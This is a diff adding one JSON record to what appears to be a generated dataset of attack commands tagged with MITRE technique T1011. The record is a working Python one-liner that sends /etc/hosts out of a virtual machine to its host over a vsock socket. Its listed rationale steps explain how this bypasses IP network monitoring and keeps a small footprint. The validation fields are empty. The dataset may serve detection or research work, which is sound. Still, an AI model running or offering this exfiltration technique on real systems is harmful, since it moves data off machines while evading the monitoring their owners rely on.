@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
+  "explanation": "Sends /etc/hosts over a virtual socket to the host (CID 2), leveraging a transport outside the primary IP stack in accordance with T1011.",
+  "rationale_steps": [
+    "Use vsock to bypass IP network monitoring pathways.",
+    "Select a high, atypical vsock port (60917).",
+    "Read /etc/hosts and send the bytes over vsock.",
+    "Close the connection to minimize footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-ffa89360",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
